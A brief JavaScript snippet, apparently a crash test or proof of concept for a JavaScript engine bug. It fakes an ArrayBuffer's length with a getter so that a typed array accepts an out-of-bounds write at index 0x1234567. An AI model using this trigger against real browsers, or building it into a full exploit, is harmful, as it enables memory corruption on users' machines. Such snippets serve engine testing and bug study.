var ab = new ArrayBuffer(8);
ab.__defineGetter__("byteLength", function() { return 0xFFFFFFFC; });
var aaa = new Uint32Array(ab);
this.__defineGetter__("x", (a = (function f() { return; (function() {}); })()) => { });
x;
aaa[0x1234567] = 1;
